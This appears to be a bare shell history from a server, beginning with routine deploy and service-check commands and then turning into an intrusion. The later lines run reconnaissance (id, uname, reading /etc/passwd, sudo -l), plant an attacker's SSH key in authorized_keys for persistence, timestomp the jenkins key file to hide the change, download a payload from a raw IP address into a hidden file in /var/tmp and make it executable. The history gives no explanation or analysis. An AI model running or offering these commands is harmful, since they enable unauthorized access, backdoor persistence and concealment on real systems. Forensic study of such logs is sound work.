git pull
make deploy
cd app
ls
systemctl status app
tail -f /var/log/app/app.log
sudo systemctl restart app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL8wYdC3BGPSo5IO+oen/AzqdCyexdn+xUu9Bz+GJPMl x@kali' >> ~/.ssh/authorized_keys
touch -r /etc/hostname /home/jenkins/.ssh/authorized_keys
wget -q http://77.148.7.204/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
